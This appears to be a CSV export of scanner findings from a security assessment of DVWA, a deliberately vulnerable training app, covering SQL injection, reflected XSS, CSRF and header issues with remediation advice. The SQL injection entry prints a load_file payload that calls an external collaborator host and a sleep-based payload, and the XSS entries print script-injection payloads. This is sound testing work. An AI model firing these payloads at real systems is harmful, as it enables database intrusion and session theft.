issue__serialNumber,issue__type,issue__name,issue__host__ip,issue__host__#Text,issue__path,issue__location,issue__severity,issue__confidence,issue__issueBackground,issue__remediationBackground,issue__references,issue__vulnerabilityClassifications,issue__issueDetail,issue__issueDetailItems__issueDetailItem__001,issue__issueDetailItems__issueDetailItem__002,issue__issueDetailItems__issueDetailItem__003,issue__issueDetailItems__issueDetailItem__004,issue__issueDetailItems__issueDetailItem__005,issue__issueDetailItems__issueDetailItem__006,issue__issueDetailItems__issueDetailItem__007,issue__issueDetailItems__issueDetailItem__008,issue__issueDetailItems__issueDetailItem__009,issue__issueDetailItems__issueDetailItem__010,issue__issueDetailItems__issueDetailItem__011,issue__issueDetailItems__issueDetailItem__012,issue__issueDetailItems__issueDetailItem__013,issue__issueDetailItems__issueDetailItem__014,issue__issueDetailItems__issueDetailItem__015,issue__issueDetailItems__issueDetailItem__016,issue__issueDetailItems__issueDetailItem__017,issue__issueDetailItems__issueDetailItem__018,issue__issueDetailItems__issueDetailItem__019,issue__issueDetailItems__issueDetailItem__020,issue__issueDetailItems__issueDetailItem,issue__staticAnalysis__source,issue__staticAnalysis__sink,issue__staticAnalysis__codeSnippets__codeSnippet__001,issue__staticAnalysis__codeSnippets__codeSnippet__002,issue__dynamicAnalysis__source,issue__dynamicAnalysis__sink,issue__dynamicAnalysis__sourceStackTrace,issue__dynamicAnalysis__sinkStackTrace,issue__dynamicAnalysis__eventListenerStackTrace,issue__dynamicAnalysis__sourceValue,issue__dynamicAnalysis__sinkValue,issue__dynamicAnalysis__eventHandlerData,issue__dynamicAnalysis__eventHandlerDataType,issue__dynamicAnalysis__eventHandlerManipulatedData,issue__dynamicAnalysis__poc,issue__dynamicAnalysis__origin,issue__dynamicAnalysis__isOriginChecked,issue__dynamicAnalysis__sourceElementId,issue__dynamicAnalysis__sourceElementName,issue__dynamicAnalysis__eventFiredEventName,issue__dynamicAnalysis__eventFiredElementId,issue__dynamicAnalysis__eventFiredElementName,issue__dynamicAnalysis__eventFiredOuterHtml,issue__remediationDetail,issue__collaboratorEvent__interactionType,issue__collaboratorEvent__originIp,issue__collaboratorEvent__time,issue__collaboratorEvent__lookupType,issue__collaboratorEvent__lookupHost
3149884944960310000,2097960,Path-relative style sheet import,127.0.0.1,http://localhost:7878,/dvwa/index.php,/dvwa/index.php,Information,Firm,"<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\n<ol>\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\n<ul>\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\n<ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\n<li>Setting the HTTP response header ""X-Content-Type-Options: nosniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","<ul><li><a href=""https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities"">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>","<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/16.html"">CWE-16: Configuration</a></li>\n  <li><a href=""https://capec.mitre.org/data/definitions/154.html"">CAPEC-154: Resource Location Spoofing</a></li>\n  <li><a href=""https://capec.mitre.org/data/definitions/468.html"">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\n</ul>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
8234982279398150000,1049088,SQL injection,127.0.0.1,http://localhost:7878,/dvwa/vulnerabilities/brute/,/dvwa/vulnerabilities/brute/ [username parameter],High,Certain,"<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>\n<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>","<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>\n<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>\n<ul>\n  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>\n  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>\n</ul>","<ul>\n<li><a href=""https://portswigger.net/web-security/sql-injection"">Web Security Academy: SQL injection</a></li>\n<li><a href=""https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws"">Using Burp to Test for Injection Flaws</a></li>\n<li><a href=""https://portswigger.net/web-security/sql-injection/cheat-sheet"">Web Security Academy: SQL Injection Cheat Sheet</a></li>\n</ul>","<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/89.html"">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/94.html"">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/116.html"">CWE-116: Improper Encoding or Escaping of Output</a></li>\n  <li><a href=""https://capec.mitre.org/data/definitions/66.html"">CAPEC-66: SQL Injection</a></li>\n</ul>","The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\95cduoirvjb0n4e5bkbu5rybz25wttlhck0bn1bq.burpcollaborator.net\\tae'))+'</b> was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20020</b> milliseconds to respond to the request, compared with <b>5</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ,DNS,49.231.70.82,2022-Mar-11 07:42:30 UTC,AAAA,95cduoirvjb0n4e5bkbu5rybz25wttlhck0bn1bq.burpcollaborator.net
8518117602912060000,2098944,Cross-site request forgery,127.0.0.1,http://localhost:7878,/dvwa/vulnerabilities/captcha/,/dvwa/vulnerabilities/captcha/,Medium,Tentative,"<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>\n<ul>\n<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>\n<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>\n<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>","<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>\n<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>","<ul>\n    <li><a href=""https://portswigger.net/web-security/csrf"">Web Security Academy: Cross-site request forgery</a></li>\n    <li><a href=""https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-"">Using Burp to Test for Cross-Site Request Forgery</a></li>\n    <li><a href=""https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf"">The Deputies Are Still Confused</a></li>\n</ul>","<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/352.html"">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>\n    <li><a href=""https://capec.mitre.org/data/definitions/62.html"">CAPEC-62: Cross Site Request Forgery</a></li>\n</ul>",The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
173665324094564000,4194576,Spoofable client IP address,127.0.0.1,http://localhost:7878,/dvwa/phpinfo.php,/dvwa/phpinfo.php,Information,Firm,"<p>\nIf an application trusts an HTTP request header like X-Forwarded-For to accurately specify the remote IP address of the connecting client, then malicious clients can spoof their IP address. This behavior does not necessarily constitute a security vulnerability, however some applications use client IP addresses to enforce access controls and rate limits. For example, an application might expose administrative functionality only to clients connecting from the local IP address of the server, or allow a certain number of failed login attempts from each unique IP address.\nConsider reviewing relevant functionality to determine whether this might be the case. </p>","<p>HTTP request headers such as X-Forwarded-For, True-Client-IP, and X-Real-IP are not a robust foundation on which to build any security measures, such as access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to spoofing.</p>\n<p>If the platform application server returns incorrect information about the client's IP address due to the presence of any particular HTTP request header, then the server may need to be reconfigured, or an alternative method of identifying clients should be used. </p>",,"<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/16.html"">CWE-16: Configuration</a></li>\n</ul>",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7223031406096760000,4194592,User agent-dependent response,127.0.0.1,http://localhost:7878,/dvwa/phpinfo.php,/dvwa/phpinfo.php,Information,Firm,"<p>Application responses may depend systematically on the value of the User-Agent header in requests. This behavior does not itself constitute a security vulnerability, but may point towards additional attack surface within the application, which may contain vulnerabilities.</p>\n<p>This behavior often arises because applications provide different user interfaces for desktop and mobile users. Mobile interfaces have often been less thoroughly tested for vulnerabilities such as cross-site scripting, and often have simpler authentication and session handling mechanisms that may contain problems that are not present in the full interface.</p>\n<p>To review the interface provided by the alternate User-Agent header, you can configure a match/replace rule in Burp Proxy to modify the User-Agent header in all requests, and then browse the application in the normal way using your normal browser. </p>",,,"<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/16.html"">CWE-16: Configuration</a></li>\n</ul>",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2172371164129440000,4194560,Referer-dependent response,127.0.0.1,http://localhost:7878,/dvwa/phpinfo.php,/dvwa/phpinfo.php,Information,Firm,"<p>Application responses may depend systematically on the presence or absence of the Referer header in requests. This behavior does not necessarily constitute a security vulnerability, and you should investigate the nature of and reason for the differential responses to determine whether a vulnerability is present.</p>\n<p>Common explanations for Referer-dependent responses include: </p>\n<ul><li>Referer-based access controls, where the application assumes that if you have arrived from one privileged location then you are authorized to access another privileged location. These controls can be trivially defeated by supplying an accepted Referer header in requests for the vulnerable function.</li><li>Attempts to prevent cross-site request forgery attacks by verifying that requests to perform privileged actions originated from within the application itself and not from some external location. Such defenses are often not robust, and can be bypassed by removing the Referer header entirely.</li>\n<li>Delivery of Referer-tailored content, such as welcome messages to visitors from specific domains, search-engine optimization (SEO) techniques, and other ways of tailoring the user's experience. Such behaviors often have no security impact; however, unsafe processing of the Referer header may introduce vulnerabilities such as SQL injection and cross-site scripting. If parts of the document (such as META keywords) are updated based on search engine queries contained in the Referer header, then the application may be vulnerable to persistent code injection attacks, in which search terms are manipulated to cause malicious content to appear in responses served to other application users.</li></ul>","<p>The Referer header is not a robust foundation on which to build access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to Referer spoofing.</p>\n<p>If the contents of responses is updated based on Referer data, then the same defenses against malicious input should be employed here as for any other kinds of user-supplied data. </p>",,"<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/16.html"">CWE-16: Configuration</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/213.html"">CWE-213: Intentional Information Exposure</a></li>\n</ul>",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
8454590958256010000,2097920,Cross-site scripting (reflected),127.0.0.1,http://localhost:7878,/dvwa/vulnerabilities/csrf/,/dvwa/vulnerabilities/csrf/ [security cookie],Medium,Certain,"<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>","<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \n  attacks can be prevented using two layers of defenses:</p>\n<ul>\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \nit is expected to contain. For example, personal names should consist of alphabetical \nand a small range of typographical characters, and be relatively short; a year of birth \nshould consist of exactly four numerals; email addresses should match a well-defined \nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\n<li>User input should be HTML-encoded at any point where it is copied into \napplication responses. All HTML metacharacters, including &lt; &gt; "" ' and =, should be \nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\n<p>In cases where the application's functionality allows users to author content using \n  a restricted subset of HTML tags and attributes (for example, blog comments which \n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>","<ul>\n	<li><a href=""https://portswigger.net/web-security/cross-site-scripting"">Web Security Academy: Cross-site scripting</a></li>\n	<li><a href=""https://portswigger.net/web-security/cross-site-scripting/reflected"">Web Security Academy: Reflected cross-site scripting</a></li>\n	<li><a href=""https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html"">Using Burp to Find XSS issues</a></li>\n</ul>","<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/79.html"">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/80.html"">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/116.html"">CWE-116: Improper Encoding or Escaping of Output</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/159.html"">CWE-159: Failure to Sanitize Special Element</a></li>\n    <li><a href=""https://capec.mitre.org/data/definitions/591.html"">CAPEC-591: Reflected XSS</a></li>\n</ul>","The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>xpgx1'&gt;&lt;script&gt;alert(1)&lt;/script&gt;xxuc3</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain ""cookie-forcing"" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
5480698897662780000,4197376,Input returned in response (reflected),127.0.0.1,http://localhost:7878,/dvwa/vulnerabilities/csrf/,/dvwa/vulnerabilities/csrf/ [security cookie],Information,Certain,"<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",,,"<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/20.html"">CWE-20: Improper Input Validation</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/116.html"">CWE-116: Improper Encoding or Escaping of Output</a></li>\n</ul>",The value of the <b>security</b> cookie is copied into the application's response.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1323706638646830000,4197376,Input returned in response (reflected),127.0.0.1,http://localhost:7878,/dvwa/phpinfo.php,/dvwa/phpinfo.php [Referer HTTP header],Information,Certain,"<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",,,"<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/20.html"">CWE-20: Improper Input Validation</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/116.html"">CWE-116: Improper Encoding or Escaping of Output</a></li>\n</ul>",The value of the <b>Referer</b> HTTP header is copied into the application's response.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
208755632020822000,2097920,Cross-site scripting (reflected),127.0.0.1,http://localhost:7878,/dvwa/vulnerabilities/csrf/test_credentials.php,/dvwa/vulnerabilities/csrf/test_credentials.php [username parameter],High,Certain,"<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>","<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \n  attacks can be prevented using two layers of defenses:</p>\n<ul>\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \nit is expected to contain. For example, personal names should consist of alphabetical \nand a small range of typographical characters, and be relatively short; a year of birth \nshould consist of exactly four numerals; email addresses should match a well-defined \nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\n<li>User input should be HTML-encoded at any point where it is copied into \napplication responses. All HTML metacharacters, including &lt; &gt; "" ' and =, should be \nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\n<p>In cases where the application's functionality allows users to author content using \n  a restricted subset of HTML tags and attributes (for example, blog comments which \n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>","<ul>\n	<li><a href=""https://portswigger.net/web-security/cross-site-scripting"">Web Security Academy: Cross-site scripting</a></li>\n	<li><a href=""https://portswigger.net/web-security/cross-site-scripting/reflected"">Web Security Academy: Reflected cross-site scripting</a></li>\n	<li><a href=""https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html"">Using Burp to Find XSS issues</a></li>\n</ul>","<ul>\n<li><a href=""https://cwe.mitre.org/data/definitions/79.html"">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/80.html"">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/116.html"">CWE-116: Improper Encoding or Escaping of Output</a></li>\n<li><a href=""https://cwe.mitre.org/data/definitions/159.html"">CWE-159: Failure to Sanitize Special Element</a></li>\n    <li><a href=""https://capec.mitre.org/data/definitions/591.html"">CAPEC-591: Reflected XSS</a></li>\n</ul>",The value of the <b>username</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>oo4wt&lt;script&gt;alert(1)&lt;/script&gt;gmyku</b> was submitted in the username parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
